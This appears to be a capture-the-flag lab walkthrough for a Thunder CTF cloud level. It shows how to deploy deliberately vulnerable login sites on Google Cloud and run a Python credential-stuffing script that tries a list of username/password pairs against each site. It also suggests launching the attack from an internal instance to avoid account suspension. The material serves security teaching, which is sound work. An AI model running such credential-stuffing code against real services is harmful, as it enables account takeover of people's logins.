<h3>Setup:</h3>
<p>Your virtual environment must be active to use thunder.py:</p>
<pre>source ../env-tctf/bin/activate</pre>
<pre>python3 thunder.py create websec/b2stuffing</pre>
<h3>Intro:</h3>
<p>Creating this level will start several vulnerable websites which we can use to attack.<br/>
A list of possible credentials are provided. One of the credential can be used to login one of the website<br/>
Use attack.py or write your own code to find this valid credential by trying each credential with every website
</p>
<p>Note:Vulnerable websites are built with identical html templates</p>
---

<p>List the instances in the project.</p>
<pre>gcloud compute instances list</pre>
<P>You should be able to see two instances listed.
<p><b>b2-container-vm-X</b>: The application you will attack is running on these machines. (Take note of their EXTERNAL_IP and INTERNAL_IP)</p>
<p><b>b2-attack-instance</b>: We are going to launch attack from this instance.</p>

---
<p>Try browse website using EXTERNAL_IP in a browser </p>
<img src="../img/b2stuffing/login.png">
<p>Use Chrome webtool(f12) or Firefox debuggerto inspect the login form </p>
<img src="../img/b2stuffing/ins.png">
<p>We can find that the name attributes of text inputs in login page are 'username' and 'password'(we will use this information in our code later). </p>
<p>Since the level is using the same html template for all websites, you only need to inspect one of the them.</p>
---
<p>Navigate to thunder-ctf/scripts/b2.</p>
<p>Take a look at attack.py and replace INTERNAL_IP/EXTERNAL_IP</p>
<pre>
import requests
#possible creds generated by level
#one of them is valid for one of your web app  
from credentials import creds

#url='http://YOUR_INTERNAL_IP/login'
urls=['http://10.138.0.58/login', 'http://10.138.0.59/login','http://10.138.0.60/login']

for url in urls:
	for u in creds:
		#prepare data for post request
		payload={'username':u,'password':creds[u]}
                #send username and password through post method to web app url
		post=requests.Session().post(url, data=payload)
                #check if respond text contains invalid credentails
		if 'Invalid credentials' not in  post.text:
			#print valid username and password
			print(u+' '+creds[u]+' ' + url )

</pre>
---
<p>If you want to attack from your local system which has pyhton installed. You can download scripts/b2 with the code below and use ENTERNAL_IP in your attack script</p>
<pre>cloudshell download scripts/b2/*</pre>
<p>or<br/></p>
<p>If you want to use google cloud environment and avoid your account being suspended for suspicious activity, you need to launch attack with INTERNAL_IP from another instance.<br/>
b2-attack-instance and b2-container-vm-X are created in the same VPC network, so they are allowed to communicate with each other via internal ips 
</p>
<p>Copy scripts/b2 from cloud shell into your attack instance </p>
<pre>gcloud compute scp --recurse scripts/b2/*  b2-attack-instance:~/</pre>
<p>SSH into your attack instance </p>
<pre>gcloud compute ssh b2-attack-instance</pre>
---
<p>Run attack script</p>
<pre>python3 attack.py</pre>
<p>You should see valid credential along with the ip printed in your terminal. </p>
---
<p>Try if you can login with printed credential in a web browser </p>
<img src="../img/b2stuffing/wel.png">

---
<p>More writeup ...</p>
